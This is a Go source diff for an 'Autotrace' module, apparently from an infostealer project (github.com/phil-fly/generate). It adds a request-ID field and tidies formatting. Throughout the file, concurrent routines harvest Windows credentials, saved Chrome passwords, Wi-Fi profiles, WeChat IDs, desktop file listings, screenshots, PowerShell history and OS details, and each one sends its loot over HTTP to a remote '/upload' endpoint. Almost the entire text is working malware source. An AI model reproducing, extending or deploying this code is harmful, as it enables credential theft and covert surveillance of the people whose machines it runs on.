@@ -1,15 +1,15 @@
 package work
 
 import (
-	"generate/core/postback"
-	"generate/pool/Desktop"
-	"generate/pool/Wifi"
-	"generate/pool/chromePwd"
-	"generate/pool/osinfo"
-	"generate/pool/powershellHistory"
-	"generate/pool/screenshot"
-	"generate/pool/wechat"
-	"generate/pool/wincreds"
+	"github.com/phil-fly/generate/core/postback"
+	"github.com/phil-fly/generate/pool/Desktop"
+	"github.com/phil-fly/generate/pool/Wifi"
+	"github.com/phil-fly/generate/pool/chromePwd"
+	"github.com/phil-fly/generate/pool/osinfo"
+	"github.com/phil-fly/generate/pool/powershellHistory"
+	"github.com/phil-fly/generate/pool/screenshot"
+	"github.com/phil-fly/generate/pool/wechat"
+	"github.com/phil-fly/generate/pool/wincreds"
 	"log"
 	"sync"
 )
@@ -17,25 +17,29 @@ import (
 type Autotrace struct {
 	remoteAddr string
 	remotePort string
-	reportUrl	string
+	reportUrl  string
+	rid        string
 }
 
-func (self *Autotrace)setupRemoteURL(){
-	self.reportUrl = "http://"+self.remoteAddr+":"+self.remotePort+"/upload"
+func (self *Autotrace) setupRemoteURL() {
+	self.reportUrl = "http://" + self.remoteAddr + ":" + self.remotePort + "/upload"
 }
 
-func (self *Autotrace)SetupRemoteAddr(remoteAddr string){
+func (self *Autotrace) SetupRemoteAddr(remoteAddr string) {
 	self.remoteAddr = remoteAddr
 }
 
-func (self *Autotrace)SetupRemotePort(remotePort string){
+func (self *Autotrace) SetupRemotePort(remotePort string) {
 	self.remotePort = remotePort
 }
 
-func (self *Autotrace)Work(){
+func (self *Autotrace) SetRid(rid string) {
+	self.rid = rid
+}
+
+func (self *Autotrace) Work() {
 	var wg sync.WaitGroup
 	self.setupRemoteURL()
-
 
 	guid := osinfo.AuniqueIdentifier()
 	if guid == "" {
@@ -47,6 +51,7 @@ func (self *Autotrace)Work(){
 		osInfo := osinfo.GetOSInformation()
 		postback2 := &postback.HttpPostback{}
 		postback2.SetTargetUrl(self.reportUrl)
+		postback2.SetRid(self.rid)
 		postback2.SetFileName("OsInfo")
 		postback2.SetGuid(guid)
 		postback2.Content = osInfo
@@ -56,10 +61,11 @@ func (self *Autotrace)Work(){
 
 	wg.Add(1)
 	go func() {
-		Wincreds,err := wincreds.GetWincred()
-		if err == nil{
+		Wincreds, err := wincreds.GetWincred()
+		if err == nil {
 			postback2 := &postback.HttpPostback{}
 			postback2.SetTargetUrl(self.reportUrl)
+			postback2.SetRid(self.rid)
 			postback2.SetFileName("Wincreds")
 			postback2.SetGuid(guid)
 			postback2.Content = Wincreds
@@ -68,13 +74,13 @@ func (self *Autotrace)Work(){
 		wg.Done()
 	}()
 
-
 	wg.Add(1)
 	go func() {
-		chromePwdInfo,err := chromePwd.GetChromePwd()
-		if err == nil{
+		chromePwdInfo, err := chromePwd.GetChromePwd()
+		if err == nil {
 			postback2 := &postback.HttpPostback{}
 			postback2.SetGuid(guid)
+			postback2.SetRid(self.rid)
 			postback2.SetTargetUrl(self.reportUrl)
 			postback2.SetFileName("ChromePwd")
 			postback2.Content = []byte(chromePwdInfo)
@@ -86,9 +92,10 @@ func (self *Autotrace)Work(){
 	wg.Add(1)
 	go func() {
 		desktopInfo := Desktop.GetDesktopFilelist()
-		if desktopInfo != ""{
+		if desktopInfo != "" {
 			postback2 := &postback.HttpPostback{}
 			postback2.SetGuid(guid)
+			postback2.SetRid(self.rid)
 			postback2.SetTargetUrl(self.reportUrl)
 			postback2.SetFileName("Desktop")
 			postback2.Content = []byte(desktopInfo)
@@ -100,13 +107,14 @@ func (self *Autotrace)Work(){
 	wg.Add(1)
 	go func() {
 		wifi := &Wifi.WifiCounter{}
-		Personal,_:=getPersonal()
+		Personal, _ := getPersonal()
 		wifi.SetShellPath(Personal)
 
-		wifiInfo,err := wifi.GetWifiInfo()
+		wifiInfo, err := wifi.GetWifiInfo()
 		if err == nil {
 			postback2 := &postback.HttpPostback{}
 			postback2.SetGuid(guid)
+			postback2.SetRid(self.rid)
 			postback2.SetTargetUrl(self.reportUrl)
 			postback2.SetFileName("wifiInfo")
 			postback2.Content = wifiInfo
@@ -121,10 +129,11 @@ func (self *Autotrace)Work(){
 		Wechat.SetResourcePath()
 		WechatId := Wechat.GetWxID()
 		Wechat.Wxid2Qrcode(WechatId)
-		log.Print("WechatId:",WechatId)
+		log.Print("WechatId:", WechatId)
 		if WechatId != "" {
 			postback2 := &postback.HttpPostback{}
 			postback2.SetGuid(guid)
+			postback2.SetRid(self.rid)
 			postback2.SetTargetUrl(self.reportUrl)
 			postback2.SetFileName("WechatId")
 			postback2.Content = []byte(WechatId)
@@ -135,10 +144,11 @@ func (self *Autotrace)Work(){
 
 	wg.Add(1)
 	go func() {
-		ScreenShotContent:= screenshot.ScreenShot()
+		ScreenShotContent := screenshot.ScreenShot()
 		if ScreenShotContent != nil {
 			postback2 := &postback.HttpPostback{}
 			postback2.SetGuid(guid)
+			postback2.SetRid(self.rid)
 			postback2.SetTargetUrl(self.reportUrl)
 			postback2.SetFileName("ScreenShot")
 			postback2.Content = ScreenShotContent
@@ -153,6 +163,7 @@ func (self *Autotrace)Work(){
 		if PowershellHistory != "" {
 			postback2 := &postback.HttpPostback{}
 			postback2.SetGuid(guid)
+			postback2.SetRid(self.rid)
 			postback2.SetTargetUrl(self.reportUrl)
 			postback2.SetFileName("PowershellHistory")
 			postback2.Content = []byte(PowershellHistory)
@@ -160,7 +171,6 @@ func (self *Autotrace)Work(){
 		}
 		wg.Done()
 	}()
-
 
 	wg.Wait()
 
